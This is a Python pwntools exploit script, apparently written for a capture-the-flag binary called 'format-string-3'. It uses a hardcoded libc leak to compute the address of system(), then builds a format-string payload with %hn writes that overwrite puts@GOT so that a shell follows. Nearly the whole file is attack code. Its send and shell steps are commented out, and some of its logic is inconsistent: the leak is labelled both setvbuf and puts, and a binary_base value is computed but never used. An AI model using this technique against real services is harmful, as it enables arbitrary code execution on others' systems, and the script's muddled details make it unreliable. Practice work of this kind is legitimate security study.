from pwn import *

# Load the binary and libc
binary = ELF('./format-string-3')  # Replace with the actual binary
libc = ELF('./libc.so.6')  # Replace with the actual libc used

# Offsets
puts_got = binary.got['puts']
puts_offset = libc.symbols['puts']
setvbuf_offset = libc.symbols['setvbuf']
system_offset = libc.symbols['system']

log.info(f"add of puts@got: {puts_got}")
# Connect to the remote service
p = process('format-string-3')  # Replace with the actual host and pot

puts_got_offset = binary.got['puts']
# Leak a libc address (e.g., puts)
#p.recvuntil(b'libc: ')
#leak = int(p.recvline().strip(), 16)
leak = 0x7fecca5a83f0
log.info(f"Leaked setvbuf address: {hex(leak)}")

# Calculate libc base and system() address
libc_base = leak - setvbuf_offset
system_addr = libc_base + system_offset
log.info(f"Libc base: {hex(libc_base)}")
log.info(f"system() address: {hex(system_addr)}")

# Calculate the runtime location of puts@GOT
binary_base = libc_base - libc.symbols['__libc_start_main'] + binary.symbols['__libc_start_main']
#puts_got = binary_base + puts_got_offset
log.info(f"puts@GOT address: {hex(puts_got)}")

# Format string exploit
# Split system() address into lower and higher bytes
lower_bytes = system_addr & 0xffff
higher_bytes = (system_addr >> 16) & 0xffff

# Adjust for padding
padding = 4  # Adjust based on stack layout
lower_offset = 6  # Replace with correct offset in format string
higher_offset = lower_offset + 1  # Adjust if necessary

# Build the payload
payload = ('\x00').encode() + p64(puts_got) + p64(puts_got + 2)  # Overwrite lower and higher bytes of puts@GOT
if lower_bytes <= higher_bytes:
    payload += f"%{lower_bytes-padding}c%{lower_offset}$hn".encode()  # Write lower bytes
    payload += f"%{higher_bytes-lower_bytes}c%{higher_offset}$hn".encode()  # Write higher bytes
else:
    payload += f"%{higher_bytes-padding}c%{higher_offset}$hn".encode()  # Write higher bytes first
    payload += f"%{lower_bytes-higher_bytes}c%{lower_offset}$hn".encode()  # Write lower bytes

print(f"{payload}")
#log.info(f"Heres the payload: {payload}")
# Send the payload
#p.sendline(payload)

# Trigger the exploit (call puts with /bin/sh as an argument)
#p.sendline(b'/bin/sh\x00')

# Get an interactive shell
#p.interactive()

